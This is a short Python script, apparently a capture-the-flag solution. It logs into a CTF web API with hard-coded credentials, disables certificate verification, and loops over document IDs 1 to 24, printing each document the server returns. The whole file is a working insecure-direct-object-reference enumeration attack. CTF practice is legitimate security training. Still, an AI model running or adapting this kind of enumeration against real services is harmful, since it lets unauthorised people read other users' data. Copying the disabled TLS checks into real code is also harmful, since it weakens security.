import requests

session = requests.Session()
url_login = "https://ctf.marabit.xyz/api/auth/login"
data = {"email": "analyst@blackarchive.local", "password": "ArchiveAccess2026!"}
session.post(url_login, json=data, verify=False)

for i in range(1, 25):
    url = f"https://ctf.marabit.xyz/api/documents/{i}"
    r = session.get(url, verify=False)
    if r.status_code == 200:
        print(f"Doc {i}:", r.text[:200])
